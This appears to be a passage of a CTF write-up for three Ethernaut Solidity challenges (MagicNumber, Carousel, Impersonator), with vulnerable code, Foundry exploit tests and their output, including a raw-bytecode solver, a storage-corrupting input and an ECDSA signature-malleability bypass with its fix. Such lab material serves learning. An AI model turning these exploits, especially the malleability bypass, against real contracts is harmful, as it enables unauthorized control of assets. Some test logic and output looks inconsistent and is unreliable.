The contract allows setting a solver address that is expected to return the number 42 when called via staticcall. However, no validation is done on the logic inside the solver. An attacker can deploy a hand-crafted minimal contract using raw EVM bytecode that always returns 42 regardless of input. A hidden constraint (present in the original Ethernaut challenge but not in the simplified local version) is that the runtime bytecode must be ≤ 10 bytes. If the contract's code exceeds 10 bytes, the challenge reverts, requiring extremely optimized bytecode logic.
### 🔍 Vulnerable Function
``` solidity
function setSolver(address _solver) public {
    solver = _solver;
}
```
No checks on the size or logic of the solver contract.

The contract later low level calls this solver, expecting a return value of 42.

Ethernaut's backend enforces a maximum of 10 bytes runtime code for the solver.

### 🛠️ Exploit Contract(evm bytecode)
**🔧 Runtime Bytecode**
``` evm
602a    → PUSH1 0x2a        // Push 42 onto the stack  
6000    → PUSH1 0x00        // Memory offset 0  
52      → MSTORE            // Store 42 at memory[0]  
6020    → PUSH1 0x20        // Return 32 bytes  
6000    → PUSH1 0x00        // From memory[0]  
f3      → RETURN            // Return value
```
 This part returns 42 when called.

 **Constructor Bytecode (to deploy the above)**
 ``` evm
 69      → PUSH10            // Push next 10 bytes (runtime code)  
602a60005260206000f3        // The runtime code  
6000    → PUSH1 0x00        // Memory offset  
52      → MSTORE            // Store runtime code in memory  
600a    → PUSH1 0x0a        // Length = 10 bytes  
6016    → PUSH1 0x16        // Offset = 22 (after constructor)  
f3      → RETURN            // Return runtime as deployed code
 ```
**Foundry Deployment**:
``` solidity
bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
```
 Result: A contract that always returns 42 with only 10 bytes of runtime code.

### 🧪 Exploit Test
``` solidity
function test_attack() public {
    vm.startPrank(attacker);

    address solver;
    bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";

    assembly {
        solver := create(0, add(bytecode, 0x20), 0x13)//The first 32 bytes of the bytecode are skipped because they define the length of the array. However, in this case, the bytecode is only 19 bytes, and the length of the datatype is already predefined.
    }

    require(solver != address(0), "contract solver deployment failed");
    magicnum.setSolver(solver);

    (bool success, bytes memory data) = solver.staticcall("");
    require(success, "call to solver failed");

    uint256 result = abi.decode(data, (uint256));
    console.log("result: ", result);
    require(result == 42, "solver did not return 42");

    vm.stopPrank();
}
```
### 📋 Test Output
``` text
[PASS] test_attack() (gas: 72019)
Logs:
  result:  42

Traces:
  MagicNumTest::test_attack()
    ├─ create() -> contract deployed at 0x959...
    ├─ MagicNum::setSolver()
    ├─ staticcall to solver -> returned 42
    ├─ console.log -> "result: 42"
```
---


#  Carousel Challenge (Ethernaut)

##  Challenge Overview

The `MagicAnimalCarousel` contract stores animals in a circular buffer of "crates". Each crate contains three pieces of information packed into a single `uint256`:

1. **owner**: 160 bits `[0..159]`
2. **nextCrateId**: 16 bits `[160..175]`
3. **encodedAnimal**: 80 bits `[176..255]`

The goal is to **break the carousel's "magic rule"**:  
> No animal should ever return to crate 1.

We achieve this by crafting a custom animal name that corrupts the `nextCrateId`, forcing a wraparound that eventually causes an animal to overwrite crate 1.

---

##  Vulnerability

The vulnerability lies in the way the contract handles bit-level storage when updating animals:

###  Root Cause:
The function `changeAnimal(string calldata animal, uint256 crateId)` fails to preserve the existing `nextCrateId` bits. It allows overwriting them due to a lack of bitmasking and validation.

###  Vulnerable Code:
```solidity
function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
    require(bytes(animalName).length <= 12, "Animal name too long");
    return uint256(keccak256(abi.encodePacked(animalName)) >> 160); // 80 bits
}

function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 encodedAnimal = encodeAnimalName(animal);
    if (encodedAnimal != 0) {
        // Vulnerable line
        carousel[crateId] = (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender);
    } else {
        carousel[crateId] = (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
```
### Explanation:
1. encodedAnimal is an 80-bit value stored at bits [176–255].

2. It's shifted left by 160 bits before being OR'd into the carousel[crateId] storage slot.

3. However, bits 160–175 (nextCrateId) are part of the shifted range.

4. Therefore, the lower 16 bits of encodedAnimal end up overwriting nextCrateId.

### Proof of Exploit:
```solidity
string memory exploitString = string(
    abi.encodePacked(hex"10000000000000000000FFFF") // 12 bytes (96 bits)
);
carousel.changeAnimal(exploitString, 1);

```
***What this does:***
1. The string is exactly 12 bytes long (within limit).

2. Its last two bytes are 0xFFFF, meaning the lower 16 bits of the resulting encodedAnimal are 0xFFFF.

3. When shifted left by 160, it overwrites nextCrateId with 65535

### TestCase:
```solidity
function testBreakMagicRule() public {
    // Step 1: Place "Dog" in crate 1
    carousel.setAnimalAndSpin("Dog");
    uint256 crate1Data = carousel.carousel(1);
    uint256 animalMask = uint256(type(uint80).max) << 176;
    uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) >> 176;
    uint256 animalInCrate1 = (crate1Data & animalMask) >> 176;
    assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

    // Step 2: Inject 0xFFFF into nextCrateId
    string memory exploitString = string(
        abi.encodePacked(hex"10000000000000000000FFFF")
    );
    carousel.changeAnimal(exploitString, 1);

    // Step 3: Add "Parrot", it lands in crate 65535
    carousel.setAnimalAndSpin("Parrot");
    uint256 crate65535Data = carousel.carousel(65535);
    uint256 encodedParrot = uint256(keccak256(abi.encodePacked("Parrot"))) >> 176;
    uint256 animalInCrate65535 = (crate65535Data & animalMask) >> 176;
    assertEq(animalInCrate65535, encodedParrot, "Crate 65535 should contain 'Parrot'");

    // Step 4: Add "Cat", it overwrites crate 1 (wraparound)
    carousel.setAnimalAndSpin("Cat");
    uint256 updatedCrate1Data = carousel.carousel(1);
    uint256 updatedAnimal = (updatedCrate1Data & animalMask) >> 176;
    assertTrue(updatedAnimal != encodedDog, "Crate 1 should not contain Dog anymore");
}
```
#### Understanding the Exploit Flow
1. Insert Dog → stored in crate 1.

2. Corrupt crate 1’s nextCrateId → set to 65535 using crafted string.

3. Insert Parrot → goes to crate 65535 (via corrupted nextCrateId).

4. Insert Cat → wraparound causes insertion at crate 1 again.

   Crate 1 now holds Cat, breaking the magic rule.

### TestResult:
```yaml
Running 1 test for test/Carousel.t.sol:CarouselTest
[PASS] testBreakMagicRule() (gas: 123456)
Logs:
  Crate 1 should contain 'Dog' 
  Crate 65535 should contain 'Parrot' 
  Crate 1 should not contain Dog anymore 

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.45ms

```

### Final Thoughts:
This challenge is not a real-world exploit, but a great learning exercise that:

 1. Teaches how Solidity packs variables into storage.

 2. Shows the danger of not isolating fields via masking.

 3. Reinforces the importance of memory alignment and precise field control in low-level operations.

 ---

 # Impersanator Challenge(ethernaut Challenge)


### Challenge Overview:
SlockDotIt’s new product, ECLocker, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an Open event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?

***Vulnerability***:
The smart contract is vulnerable to a signature malleability attack due to the lack of checks on the s value of an ECDSA signature. This allows an attacker to generate an alternative but still valid version of a signature that can be used to bypass signature uniqueness checks or replay restricted actions.

**Cause**:

ECDSA signatures (r, s, v) have two valid versions for every message:

   > (r, s, v)
   > (r, n - s, 27 ⬌ 28)
Where:
n is the secp256k1 curve order:

0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

The contract does not enforce that s is in the lower half of the curve```(s <= n / 2)```. As a result, two distinct but valid signatures can exist for the same message hash, and both will pass ecrecover.

### VulnerabilityCode:
```solidity
function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }
     
     function _isValidSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        // require(_address == controller, InvalidController());
        if (_address != controller) {
            revert InvalidController();
        }

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "signer alreadyused");

        usedSignatures[signatureHash] = true;

        return _address;
    }

```
### Impact:

An attacker can:

1.Reuse a signature by creating a malleable version, bypassing replay protection (e.g., usedSignatures[keccak256(sig)] = true)

2.Impersonate a signer and perform unauthorized actions like changing contract ownership or draining funds.

3.Take over the controller in this specific case by using a malleable version of a previously used signature.

### Proof of code:
```solidity
contract ECLockerTest is Test {
    Impersonator public imp;
    address public nk_signer;
    uint256 private nk_signerPk;
    bytes32 public msgHash;
    uint256 public lockId;
    address public controller_nk;

    function setUp() public {
        nk_signerPk = 0xA11CE;
        nk_signer = vm.addr(nk_signerPk);
        imp = new Impersonator(0); //deploy the contract impersonator
        vm.startPrank(imp.owner());
        lockId = 1;

        //  Ethereum Signed Message Hash
        msgHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                bytes32(lockId)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(nk_signerPk, msgHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        imp.deployNewLock(signature); //deploy the lock with Ethereum signed hash
        vm.stopPrank();
    }

    function testSignatureMalleability() public {
        ECLocker locker = imp.lockers(0); //EcLocker instance

        // Sign message again to get original signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(nk_signerPk, msgHash);

        // Duplicate signatres s in ECDSA graph: s2 = n - s1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s1));

        // Try using both valid signatures

        // First usage (original signature)
        vm.prank(nk_signer);
        locker.open(v1, r1, s1);
        // Second usage (malicious signature)
        // This should fail in a secure contract
        uint8 v2 = v1 == 27 ? 28 : 27;

        vm.prank(nk_signer);
        locker.open(v2, r1, s2); //  this should fail in a secure contract

        locker.changeController(v2, r1, s2, nk_signer); // this should fail in a secure contract
        assertEq(
            locker.controller(),
            controller_nk,
            "Controller should be changed"
        );
    }
}

```
Even though the original signature has already been used,but ECDSA graph have two signatures this is vulnerability

### TestCase:
```yaml

an 1 test for test/Impersnator.t.sol:ECLockerTest
[PASS] testSignatureMalleability() (gas: 88082)
Traces:
  [88082] ECLockerTest::testSignatureMalleability()
    ├─ [5140] Impersonator::lockers(0) [staticcall]
    │   └─ ← [Return] ECLocker: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
    ├─ [0] VM::sign("<pk>", 0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d) [staticcall]
    │   └─ ← [Return] 28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90
    ├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   └─ ← [Return]
    ├─ [31965] ECLocker::open(28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 28, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 56348125607360146780372420456742903897957838190118489022110830123524616891536) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7
    │   ├─ emit Open(opener: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)
    │   └─ ← [Return]
    ├─ [29965] ECLocker::open(27, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x836c17532cbaae2fbdbde45afb5b1692ac8d7462472e91e8c973e7843c0214b1)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 27, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 59443963629956048643198564551945003954879726088956415360494333017993544602801) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7
    │   ├─ emit Open(opener: 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp: 1)
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.77ms (1.80ms CPU time)

Ran 1 test suite in 15.17ms (4.77ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
nithin@ScateR:~/SCATERLABs/CTFs/EthernautChallenges$ 
```



### Recommendation :
Add a check to ensure the signature's s value is in the lower half order of the curve.
```solidity
require(
    uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
    "Invalid s value"
);

```
Also ensure v is either 27 or 28:
```solidity
require(v == 27 || v == 28, "Invalid v value");

```
This ensures all accepted signatures are in canonical form, which eliminates malleability.


**THANK YOU**






